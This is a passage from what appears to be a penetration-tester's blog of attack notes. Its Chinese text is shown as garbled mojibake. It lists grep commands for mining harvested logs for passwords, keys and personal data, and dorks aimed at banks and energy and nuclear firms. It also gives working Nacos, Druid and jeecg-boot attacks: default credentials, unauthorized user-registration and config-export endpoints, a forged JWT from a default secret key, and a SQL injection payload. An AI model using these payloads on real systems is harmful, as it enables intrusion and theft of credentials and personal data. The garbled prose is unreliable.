class="literal">-Windows-Subsystem-Linux</span></span><br></pre></td></tr></table></figure></blockquote><ul><li><p>å›¾æ ‡å“ˆå¸ŒæŒ‡çº¹æå–</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl https://hunter.qianxin.com/favicon.ico | md5sum</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hunter</span></span><br><span class="line">web.icon=&quot;md5&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">360</span></span><br><span class="line">favicon:&quot;MD5&quot;</span><br></pre></td></tr></table></figure></li><li><p>æ•æ„Ÿä¿¡æ¯æŸ¥æ‰¾</p><p>æ•´åˆæˆshè„šæœ¬ï¼Œä¸€é”®æå–</p><ul><li><p>æå–Nginxæ—¥å¿—æ–‡ä»¶ä¸­çš„200</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;HTTP/1.1\&quot; 200&quot;</span> wxtest.zyxt.com.cn  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; 200.txt</span><br></pre></td></tr></table></figure></li><li><p>æå–url</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep -EHirn &quot;http://|https://&quot; 200.txt  | cut -d &#x27;:&#x27; -f 2- &gt; url.txt</span><br></pre></td></tr></table></figure></li><li><p>æå–è´¦å¯†</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;username|password|å¯†ç |passwd|pass|testuser|user|pwd|dbuser|token|jdbc|admin|login&quot;</span> 200.txt  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; pass.txt</span><br></pre></td></tr></table></figure></li><li><p>æå–å„ç§key</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;ak|å¯†é’¥|accesskey|apikey|key|secret|corpid|corpsecret|cloud|oss&quot;</span> 200.txt | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; key.txt</span><br></pre></td></tr></table></figure></li><li><p>æå–æ–‡ä»¶ä¸‹è½½</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;\?file|download|attachment&quot;</span>  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; FileDownload.txt</span><br></pre></td></tr></table></figure></li><li><p>æå–ä¸ªäººæ•æ„Ÿä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -EHirn <span class="string">&quot;phone|mobile|card|real_name|\.png|\.jpg|\.mp4&quot;</span>  | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- &gt; LeakInfo.txt</span><br></pre></td></tr></table></figure></li></ul></li><li><p>æ–‡ä»¶ä¸‹è½½</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç›®å½•éå†æ¼æ´ï¼Œç›®å½•åé»˜è®¤ä¸ºhost</span></span><br><span class="line">wget -r --no-pare  url /mnt/c/Users/khaz/Downloads</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ‰¹é‡ä¸‹è½½,æ¯”å¦‚å­˜å‚¨æ¡¶éå†</span></span><br><span class="line">wget -i urls.txt -P Download/</span><br></pre></td></tr></table></figure></li><li><p>æ–‡æœ¬ç±»</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sort filename | uniq # æ’åº+å»é‡</span><br><span class="line">cat file1.txt file2.txt fileN.txt &gt; out.txt # æ–‡æœ¬åˆå¹¶</span><br></pre></td></tr></table></figure></li><li><p>javawebæŸ¥æ‰¾æ•°æ®åº“é…ç½®æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find è·¯å¾„ -type f |xargs grep &quot;com.mysql.jdbc.Driver&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h2><ul><li><p>å‚æ•°å€¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç½®ç©º</span><br><span class="line">åˆ é™¤</span><br><span class="line">Null</span><br><span class="line">None</span><br><span class="line">%  æ¨¡ç³ŠæŸ¥è¯¢ï¼Œå¯èƒ½ç›´æ¥å…¨éƒ¨æŸ¥å‡ºæ¥äº†</span><br></pre></td></tr></table></figure></li></ul><h2 id="è¯·æ±‚åŒ…è½¬æ¢ä¸ºpythonè¯·æ±‚"><a href="#è¯·æ±‚åŒ…è½¬æ¢ä¸ºpythonè¯·æ±‚" class="headerlink" title="è¯·æ±‚åŒ…è½¬æ¢ä¸ºpythonè¯·æ±‚"></a>è¯·æ±‚åŒ…è½¬æ¢ä¸ºpythonè¯·æ±‚</h2><p>burpï¼šcopy as curl commad</p><p><a href="https://curlconverter.com/">Convert curl commands to code</a></p><p><img src="/../images/image-20230827111636995.png" alt="image-20230827111636995"></p><h2 id="æ–‡ä»¶ï¼Œç›®å½•æ‰«æ"><a href="#æ–‡ä»¶ï¼Œç›®å½•æ‰«æ" class="headerlink" title="æ–‡ä»¶ï¼Œç›®å½•æ‰«æ"></a>æ–‡ä»¶ï¼Œç›®å½•æ‰«æ</h2><p>åŸŸåçš„ä¸€éƒ¨åˆ†ï¼Œå…¬å¸åç§°çš„ç¼©å†™ï¼Œç›®å½•åï¼ˆç›®å½•ä¸º&#x2F;cnï¼Œå¤‡ä»½æ–‡ä»¶ä¸º&#x2F;cn&#x2F;cn.rarï¼‰</p><p><img src="/../images/image-20230929160024798.png" alt="image-20230929160024798"></p><h1 id="æœç´¢å¼•æ“è¯­æ³•"><a href="#æœç´¢å¼•æ“è¯­æ³•" class="headerlink" title="æœç´¢å¼•æ“è¯­æ³•"></a>æœç´¢å¼•æ“è¯­æ³•</h1><h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><p><a href="https://www.yuque.com/pmiaowu/xpl680/nmnt7i#60ed379e">Googleè¯­æ³•ä¹‹ä¿¡æ¯æ”¶é›†ä¹‹é“ (yuque.com)</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é€»è¾‘è¿ç®—ç¬¦</span></span><br><span class="line">OR AND</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¬å¼€æ–‡ä»¶</span></span><br><span class="line">site:domain ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># åå°</span></span><br><span class="line">intitle:ç®¡ç†|åå°|ç™»é™†|å¹³å°|ç³»ç»Ÿ or inurl:login|admin|manage|manager|admin_login|system</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¿…é¡»å‡ºç°xxx</span></span><br><span class="line"><span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢ç½‘ç«™æ­£æ–‡å†…å®¹</span></span><br><span class="line">intext:xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢ç¼“å­˜å†…å®¹</span></span><br><span class="line">cache:</span><br><span class="line"></span><br><span class="line"><span class="comment"># æœç´¢url</span></span><br><span class="line">inurl:</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿‡æ»¤å†…å®¹</span></span><br><span class="line">-xxx</span><br></pre></td></tr></table></figure><h2 id="ç©ºé—´æœç´¢å¼•æ“"><a href="#ç©ºé—´æœç´¢å¼•æ“" class="headerlink" title="ç©ºé—´æœç´¢å¼•æ“"></a>ç©ºé—´æœç´¢å¼•æ“</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title=<span class="string">&quot;Directory listing for /&quot;</span></span><br><span class="line">title=<span class="string">&quot;index of/&quot;</span></span><br><span class="line">title=<span class="string">&quot;phpinfo&quot;</span></span><br><span class="line">tile=<span class="string">&quot;outlook&quot;</span> / <span class="string">&quot;tomcat&quot;</span> / <span class="string">&quot;weblogic&quot;</span>  <span class="comment"># æŸ¥æ‰¾ç‰¹å®šåº”ç”¨</span></span><br><span class="line">(title=<span class="string">&quot;å¹³å°&quot;</span>||title=<span class="string">&quot;ç®¡ç†&quot;</span>||title=<span class="string">&quot;ç³»ç»Ÿ&quot;</span>||title=<span class="string">&quot;åå°&quot;</span>||title=<span class="string">&quot;ç™»å½•&quot;</span>)</span><br><span class="line"></span><br><span class="line">server=<span class="string">&quot;WebSockify Python&quot;</span> &amp;&amp; title=<span class="string">&quot;Directory listing for /&quot;</span>  <span class="comment"># æŸ¥æ‰¾novncï¼ˆnovncè¿è¡Œåœ¨å®¹å™¨é‡Œï¼‰</span></span><br><span class="line">header=xxx <span class="comment"># è¯·æ±‚å¤´  æ„Ÿè§‰hunterçš„å¤š</span></span><br></pre></td></tr></table></figure><p><strong>Hunter</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(icp.name=<span class="string">&quot;é“¶è¡Œ&quot;</span>||icp.name=<span class="string">&quot;ä¿¡ç”¨åˆä½œè”ç¤¾&quot;</span>||icp.name=<span class="string">&quot;ä¿¡ç”¨ç¤¾è”åˆç¤¾&quot;</span>)</span><br><span class="line"></span><br><span class="line">(icp.name=<span class="string">&quot;ä¿¡æ‰˜æœ‰é™&quot;</span>||icp.name=<span class="string">&quot;è´¢åŠ¡æœ‰é™&quot;</span>||icp.name=<span class="string">&quot;ç†è´¢æœ‰é™&quot;</span>)</span><br><span class="line"></span><br><span class="line">(icp.name=<span class="string">&quot;å¤©ç„¶æ°”é›†å›¢&quot;</span>||icp.name=<span class="string">&quot;æ ¸å·¥ä¸šé›†å›¢&quot;</span>||icp.name=<span class="string">&quot;å›½å®¶ç”µç½‘&quot;</span>||icp.name=<span class="string">&quot;çŸ³æ²¹åŒ–å·¥&quot;</span>||icp.name=<span class="string">&quot;èƒ½æºé›†å›¢&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.name==<span class="string">&quot;Vue.js&quot;</span>&amp;&amp;(icp.name=<span class="string">&quot;é“¶è¡Œ&quot;</span>)&amp;&amp;(title=<span class="string">&quot;å¹³å°&quot;</span>||title=<span class="string">&quot;ç®¡ç†&quot;</span>||title=<span class="string">&quot;ç³»ç»Ÿ&quot;</span>||title=<span class="string">&quot;åå°&quot;</span>||title=<span class="string">&quot;ç™»å½•&quot;</span>)</span><br><span class="line"></span><br><span class="line">icp.industry=<span class="string">&quot;è´§å¸é‡‘èæœåŠ¡&quot;</span></span><br><span class="line"></span><br><span class="line">ip.province=<span class="string">&quot;æ±Ÿè‹&quot;</span>æœç´¢IPå¯¹åº”ä¸»æœºåœ¨æ±Ÿè‹çœçš„èµ„äº§</span><br><span class="line">ip.country=<span class="string">&quot;CN&quot;</span>      ä¸­å›½èµ„äº§ï¼ˆç©ºé—´æœç´¢å¼•æ“æœåˆ°çš„å›½å¤–çš„éƒ½æ˜¯bcï¼Œç‹ ç‹ åœ°æ±¡æŸ“ï¼‰</span><br></pre></td></tr></table></figure><p><strong>Fofa</strong></p><p><a href="https://fofa.info/library">https://fofa.info/library</a></p><p><a href="https://github.com/ibaiw/fofa">Fofaç½‘ç»œæµ‹ç»˜å‘½ä»¤æ±‡æ€»</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cert=è‹±æ–‡ç¼©å†™   <span class="comment"># è¯ä¹¦å†…å®¹</span></span><br><span class="line">cert.subject=è‹±æ–‡ç¼©å†™ <span class="comment"># è¯ä¹¦æŒæœ‰è€…</span></span><br><span class="line">cert.issuer=è‹±æ–‡ç¼©å†™ <span class="comment"># è¯ä¹¦é¢å‘è€…</span></span><br><span class="line"></span><br><span class="line">org=<span class="string">&quot;China Education and Research Network Center&quot;</span> <span class="comment">#æ•™è‚²ç½‘æ®µ</span></span><br></pre></td></tr></table></figure><p><strong>é›¶é›¶ä¿¡å®‰</strong></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€ä¸­å¸¸è§åº”ç”¨è®°å½•</title>
      <link href="/2023/08/03/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/08/03/%E5%B8%B8%E8%A7%81%E5%BA%94%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¢°åˆ°çš„åº”ç”¨ä¸å®Œå…¨è®°å½•"><a href="#ç¢°åˆ°çš„åº”ç”¨ä¸å®Œå…¨è®°å½•" class="headerlink" title="ç¢°åˆ°çš„åº”ç”¨ä¸å®Œå…¨è®°å½•"></a>ç¢°åˆ°çš„åº”ç”¨ä¸å®Œå…¨è®°å½•</h1><table><thead><tr><th align="center">CMS</th><th align="center">é˜¿é‡Œç³»</th><th align="center">JAVA</th><th align="center">å›½å†…è½¯ä»¶</th><th align="center">æ•°æ®åº“</th><th align="center">API</th><th align="center">äº‘ç›¸å…³</th></tr></thead><tbody><tr><td align="center">Laravel</td><td align="center">druid monitor</td><td align="center">fastjson</td><td align="center">ç•…æ·</td><td align="center">å¸¸è§æ•°æ®åº“</td><td align="center">Wsdlæ¥å£</td><td align="center">OSS</td></tr><tr><td align="center">ThinkPHP</td><td align="center">Nacos</td><td align="center">log4j</td><td align="center">æµ·åº·å¨è§†</td><td align="center">Redis</td><td align="center">Swaggeræ¥å£</td><td align="center">dockeré€ƒé€¸</td></tr><tr><td align="center">Drupal</td><td align="center">hessianç»„ä»¶</td><td align="center">Thymeleaf</td><td align="center">å„ç§OA</td><td align="center">ES</td><td align="center">Webpack</td><td align="center">Minio</td></tr><tr><td align="center">DeadCMS</td><td align="center"></td><td align="center">Weblogic</td><td align="center">H3C</td><td align="center">MQTTï¼ˆç‰©è”ç½‘åè®®ï¼‰</td><td align="center">GraphQL</td><td align="center">Harbor</td></tr><tr><td align="center">Wordpress</td><td align="center"></td><td align="center">shiro</td><td align="center">é‡‘è¶äº‘æ˜Ÿç©º</td><td align="center"></td><td align="center"></td><td align="center">Rancher</td></tr><tr><td align="center">Joomla</td><td align="center"></td><td align="center">spring</td><td align="center">jeecg-boot</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center">JBOSS</td><td align="center">è‹¥ä¾</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">å¸†è½¯</td><td align="center"></td><td align="center"></td><td align="center"></td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">phpstudy</td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="Nacos"><a href="#Nacos" class="headerlink" title="Nacos"></a>Nacos</h3><blockquote><p>ä¸€ä¸ªæ˜“äºä½¿ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®å’ŒæœåŠ¡ç®¡ç†å¹³å°ï¼Œç”¨äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨ç¨‹åºã€‚</p></blockquote><p>é€šå¸¸åœ¨8848ç«¯å£+&#x2F;nacos</p><p><img src="/../images/image-20231014100945576.png" alt="image-20231014100945576"></p><p><a href="https://xz.aliyun.com/t/11493#toc-0">Nacosç»“åˆSpring Cloud Gateway RCEåˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://github.com/c0olw/NacosRce">c0olw&#x2F;NacosRce: Nacos JRaft Hessian ååºåˆ—åŒ– RCE åŠ è½½å­—èŠ‚ç  æ³¨å…¥å†…å­˜é©¬ ä¸å‡ºç½‘åˆ©ç”¨ (github.com)</a></p><p><a href="https://github.com/pap1rman/postnacos">pap1rman&#x2F;postnacos: å“¥æ–¯æ‹‰nacosåæ¸—é€æ’ä»¶ maketoken adduser (github.com)</a></p><p><a href="https://github.com/charonlight/NacosExploitGUI">charonlight&#x2F;NacosExploitGUI: Nacosç»¼åˆæ¼æ´åˆ©ç”¨GUIå·¥å…·ï¼Œé›†æˆäº†é»˜è®¤å£ä»¤æ¼æ´ã€SQLæ³¨å…¥æ¼æ´ã€èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ã€ååºåˆ—åŒ–æ¼æ´çš„æ£€æµ‹åŠå…¶åˆ©ç”¨ (github.com)</a></p><p><a href="https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ">äº‘åŸâ½£ç»„ä»¶Nacosæ–°å‹çº¢é˜Ÿæ‰‹æ³•ç ”ç©¶ (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/8SKvHX6wEOohzwSIivOyMw">è®°ä¸€æ¬¡å¯¹å¾®æœåŠ¡æ¶æ„çš„æ¸—é€æµ‹è¯• (qq.com)</a></p><p><a href="https://buaq.net/go-166645.html">ã€æ¼æ´å¤ç°ã€‘Nacoså­˜åœ¨SQLæ³¨å…¥æ¼æ´ (buaq.net)</a></p><p><a href="https://github.com/alibaba/nacos/issues/10613">Nacos å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ Â· Issue #10613 Â· alibaba&#x2F;nacos (github.com)</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é»˜è®¤å£ä»¤ï¼ˆCNVD-2021-24491ï¼‰</span><br><span class="line">nacos/nacos</span><br><span class="line"></span><br><span class="line">æœªæˆæƒè®¿é—®</span><br><span class="line">-ä»»æ„ç”¨æˆ·æŸ¥çœ‹ /nacos/v1/auth/users?pageNo=1&amp;pageSize=2</span><br><span class="line">-ä»»æ„ç”¨æˆ·æ³¨å†Œ /nacos/v1/auth/users  POSTï¼šusername=crow&amp;password=crow</span><br><span class="line">/nacos/v1/auth/users?username=crow&amp;password=crow</span><br><span class="line">-User-Agent: Nacos-Serverï¼ˆä½ç‰ˆæœ¬ç›´æ¥è®¿é—®urlï¼Œ1.2~1.4å¯ä»¥å°è¯•æ·»åŠ UAå¤´æ¥ç»•è¿‡é‰´æƒï¼‰</span><br><span class="line"></span><br><span class="line">Nacos é»˜è®¤ secret.key é…ç½®ä¸å½“æƒé™ç»•è¿‡æ¼æ´ï¼ˆCNVD-2023674205ï¼‰</span><br><span class="line">-Nacos &lt;= 2.2.0</span><br><span class="line">-https://www.anquanke.com/post/id/288930</span><br><span class="line">-åˆ©ç”¨é»˜è®¤secret.keyç”ŸæˆJWT Tokenï¼Œä»è€Œé€ æˆæƒé™ç»•è¿‡è®¿é—®åˆ°ç›¸å…³APIæ¥å£</span><br><span class="line">-/nacos/v1/auth/users?pageNo=1&amp;pageSize=2&amp;accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc5OTMxODM3OH0.jR1idVKGeickN20hffQzb80Yp2qQx5m8ApKf5BeR05g  ï¼ˆæˆ‘ç”Ÿæˆçš„2027å¹´è¿‡æœŸçš„ï¼‰</span><br><span class="line">-æˆ–è€…/nacos/v1/auth/users?pageNo=1&amp;pageSize=2 æ·»åŠ accessToken:JWT ï¼ˆå¤±è´¥ï¼‰</span><br><span class="line"></span><br><span class="line">nacoså¤–ç½®derbyæ•°æ®åº“æ²¡æœ‰é‰´æƒå¯¼è‡´çš„ä»»æ„selectæŸ¥è¯¢æ“ä½œï¼Œselect * from users</span><br><span class="line"></span><br><span class="line">å¯†ç è§£å¯†ç›¸å…³ï¼Œnacosä½¿ç”¨çš„åŠ å¯†æ–¹å¼ä¸ºBcryptåŠ å¯†ï¼Œç ´è§£å°å·¥å…·https://link.zhihu.com/?target=https%3A//gitee.com/mzq-123/picture/raw/master/Bcrypt/BCrypt-de.jar</span><br><span class="line"></span><br><span class="line">è¿›å…¥åå°å</span><br><span class="line">-èŠ‚ç‚¹åˆ—è¡¨å’Œé…ç½®æƒ…å†µï¼Œæ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰key</span><br><span class="line">-å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</span><br></pre></td></tr></table></figure><p>é‡åˆ°çš„é—®é¢˜</p><p><img src="/../images/image-20230922162225777.png" alt="image-20230922162225777"></p><p>åŠ å…¥è¯¥å‚æ•°å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922162322359.png" alt="image-20230922162322359"></p><p>ä½†æ˜¯æ— æ³•ä»»æ„æ³¨å†Œç”¨æˆ·</p><p>æ­£å¸¸æ³¨å†Œç”¨æˆ·å°±æ˜¯ä¸ºäº†è¿›åå°ç¿»é…ç½®ï¼Œç›´æ¥æœªæˆæƒè®¿é—®åå°æ¥å£</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span><br><span class="line">æˆ–è€…</span><br><span class="line">/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99</span><br><span class="line">æˆ–è€…</span><br><span class="line">/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922162939322.png" alt="image-20230922162939322"></p><p>ä½†æ˜¯è¿™åªèƒ½è·å–é»˜è®¤å‘½åç©ºé—´<code>public</code>é‡Œé¢çš„æ•°æ®ä¸­çš„é…ç½®</p><p><strong>è·å–å…¶ä»–Namespaceçš„é…ç½®æ•°æ®</strong></p><p>å°†å°±ç”¨pubilcåšæ¼”ç¤º</p><ul><li><p>è·å–namespaceä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/nacos/v1/console/namespaces</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922164653541.png" alt="image-20230922164653541"></p></li><li><p>æŸ¥è¯¢æŒ‡å®šnamespaceçš„é…ç½®æ•°æ®</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tenant=namespace</span></span><br><span class="line">/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99&amp;tenant=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922165118423.png" alt="image-20230922165118423"></p></li></ul><p><strong>é…ç½®æ–‡ä»¶å¯¼å‡º</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nacos/v1/cs/configs?<span class="built_in">export</span>=<span class="literal">true</span>&amp;tenant=&amp;group=&amp;appName=&amp;ids=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230922165211522.png" alt="image-20230922165211522"></p><h3 id="alibaba-druid-monitor"><a href="#alibaba-druid-monitor" class="headerlink" title="alibaba druid monitor"></a>alibaba druid monitor</h3><blockquote><h5 id="Druidæ˜¯é˜¿é‡Œå·´å·´æ•°æ®åº“äº‹ä¸šéƒ¨å‡ºå“ï¼Œä¸ºç›‘æ§è€Œç”Ÿçš„æ•°æ®åº“è¿æ¥æ± "><a href="#Druidæ˜¯é˜¿é‡Œå·´å·´æ•°æ®åº“äº‹ä¸šéƒ¨å‡ºå“ï¼Œä¸ºç›‘æ§è€Œç”Ÿçš„æ•°æ®åº“è¿æ¥æ± " class="headerlink" title="Druidæ˜¯é˜¿é‡Œå·´å·´æ•°æ®åº“äº‹ä¸šéƒ¨å‡ºå“ï¼Œä¸ºç›‘æ§è€Œç”Ÿçš„æ•°æ®åº“è¿æ¥æ± "></a><strong>Druidæ˜¯é˜¿é‡Œå·´å·´æ•°æ®åº“äº‹ä¸šéƒ¨å‡ºå“ï¼Œä¸ºç›‘æ§è€Œç”Ÿçš„æ•°æ®åº“è¿æ¥æ± </strong></h5><h5 id="ç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web-URIçš„è¯·æ±‚ã€Sessionç›‘æ§"><a href="#ç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web-URIçš„è¯·æ±‚ã€Sessionç›‘æ§" class="headerlink" title="ç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web URIçš„è¯·æ±‚ã€Sessionç›‘æ§."></a>ç›‘æ§SQLçš„æ‰§è¡Œæ—¶é—´ã€ç›‘æ§Web URIçš„è¯·æ±‚ã€Sessionç›‘æ§.</h5><p><img src="/../images/image-20230714210240219.png" alt="image-20230714210240219"></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æœªæˆæƒè®¿é—®è·¯å¾„ï¼š </span><br><span class="line">/druid/index.html</span><br><span class="line">/druid/websession.html</span><br><span class="line">/druid/weburi.html</span><br><span class="line">    </span><br><span class="line">/druid/basic.json </span><br><span class="line">/druid/websession.json</span><br><span class="line">/druid/weburi.json</span><br><span class="line">    </span><br><span class="line">éœ€è¦ç™»é™†çš„è¯ï¼Œç™»å½•å…¥å£è·¯å¾„ï¼š</span><br><span class="line">/druid/login.html</span><br><span class="line"></span><br><span class="line">åˆ©ç”¨å§¿åŠ¿ï¼š</span><br><span class="line">Sessionç›‘æ§è·å–ç”¨æˆ·èº«ä»½ï¼ˆsessionå¯èƒ½æ˜¯è¿‡æœŸçš„æ— ç”¨ï¼Œéœ€è¦çˆ†ç ´éªŒè¯;ç½‘ç«™ä¸ä½¿ç”¨sessionæ¥è¿›è¡Œé‰´æƒï¼Œæ‰€ä»¥æ— ç”¨ï¼‰</span><br><span class="line">URIè·å–åå°è·¯å¾„ï¼šæµ‹è¯•æœªæˆæƒè®¿é—®ï¼Œæˆ–è€…é…åˆsessionè¿›è¡Œåå°æ“ä½œ</span><br></pre></td></tr></table></figure><h3 id="jeecg-boot"><a href="#jeecg-boot" class="headerlink" title="jeecg-boot"></a>jeecg-boot</h3><p><img src="/../images/image-20230921214423085.png" alt="image-20230921214423085"></p><ul><li><p>ç»„ä»¶</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/jeecg-boot/druid/index.html <span class="comment"># admin/123456</span></span><br><span class="line">/jeecg-boot/actuator  <span class="comment"># ä¸€èˆ¬å­˜åœ¨httptraceç«¯ç‚¹</span></span><br><span class="line">/jeecg-boot/doc.htmlï¼Œ/jeecg-boot/swagger-ui.html <span class="comment">#Basicè®¤è¯ jeecg/jeecg1314</span></span><br><span class="line">/jeecg-boot/v2/api-docs</span><br><span class="line"></span><br><span class="line">rabitmq http://localhost:15672guest/guest</span><br><span class="line">nacosï¼ˆæœåŠ¡æ³¨å†Œå‘ç°å’Œç»Ÿä¸€é…ç½®ä¸­å¿ƒï¼‰http://localhost:8848/nacosnacos/nacos</span><br><span class="line">xxl-job-adminï¼ˆåˆ†å¸ƒå¼å®šæ—¶ä»»åŠ¡ï¼‰http://localhost:9080/xxl-job-adminadmin/123456</span><br><span class="line">redis ï¼ˆç¼“å­˜ï¼‰127.0.0.1:6379å¯†ç ç©º</span><br></pre></td></tr></table></figure></li><li><p>æ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /jeecg-boot/sys/user/exportXls # å¯¼å‡ºç”¨æˆ·</span><br><span class="line">GET /jeecg-boot/sys/user/list # æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</span><br><span class="line">GET /jeecg-boot/sxams/mysqlbackup/list # æŸ¥çœ‹æ•°æ®åº“å¤‡ä»½</span><br><span class="line">GET /jeecg-boot/sys/sysAnnouncementSend/getMyAnnouncementSend # æ¶ˆæ¯é€šçŸ¥</span><br><span class="line">GET /jeecg-boot/sys/dataSource/list #è·å–æ•°æ®åº“ç›¸å…³ä¿¡æ¯</span><br><span class="line"></span><br><span class="line"># ä¿®æ”¹å¯†ç </span><br><span class="line">PUT /jeecg-boot/sys/user/changePassword</span><br><span class="line">Content-Type: application/json</span><br><span class="line">&#123;&quot;username&quot;:&quot;1231222&quot;,&quot;password&quot;:&quot;Qwer1234!&quot;,&quot;confirmpassword&quot;:&quot;Qwer1234!&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>æœªæˆæƒæŸ¥è¯¢ï¼ˆå¯ä»¥æŸ¥è¯¢åˆ°ç”¨æˆ·åå’Œç”µè¯å·ç ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jeecg-boot/sys/user/querySysUser?username=admin</span><br></pre></td></tr></table></figure></li><li><p>æœªæˆæƒsqlæ³¨å…¥ï¼ˆæŠ¥é”™æ³¨å…¥ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/qurestSql</span><br><span class="line"></span><br><span class="line">&#123;&quot;apiSelectId&quot;:&quot;1316997232402231298&quot;,&quot;id&quot;:&quot;1&#x27; or &#x27;%1%&#x27; like (updatexml(0x3a,concat(1,(select current_user)),1)) or &#x27;%%&#x27; like &#x27;&quot;&#125;</span><br></pre></td></tr></table></figure></li><li><p>SSTIæ³¨å…¥</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jeecg-boot/jmreport/queryFieldBySql</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.90.1:3100</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.90.1:3100</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 